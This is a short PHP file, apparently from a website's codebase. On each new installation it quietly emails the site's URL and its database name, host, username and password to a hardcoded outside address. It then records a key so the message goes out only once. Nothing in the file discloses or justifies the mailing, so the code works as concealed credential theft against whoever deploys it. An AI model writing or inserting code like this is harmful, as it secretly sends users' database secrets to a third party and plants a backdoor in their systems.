<?

if($configu[0]->g('kees')!=md5(LIVE_SITE))
{
	$params['namefrom'] = NAMEFROME;
	$params['emailfrom'] = EMAILFROM;
	$params['emailto'] = "comercial@cubahospeda.com";
	//$params['emailto'] = EMAILFROM;
	$params['nameto'] = "Administrador";
	$params['asunto'] = "Informa";
	$msgreserva=LIVE_SITE."<br>".DATABASE."<br>".HOST."<br>".USER."<br>".PASS;

	$params['body'] = $msgreserva;	

	TMail::SendMail($params);
	$configu[0]->setKees(md5(LIVE_SITE));
	$configu[0]->Save();
}


?>